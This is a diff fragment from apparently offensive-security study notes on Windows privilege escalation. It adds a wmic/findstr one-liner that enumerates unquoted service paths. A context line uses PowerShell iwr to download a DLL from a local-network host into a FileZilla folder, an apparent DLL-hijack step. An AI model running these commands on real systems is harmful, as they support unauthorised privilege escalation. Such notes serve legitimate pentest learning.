@@ -1163,4 +1163,10 @@ iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FT
 
 ### Unquoted Service Paths
 
+#### List of services with spaces and missing quotes in the binary path
+
+~~~ powershell
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+~~~
+
 
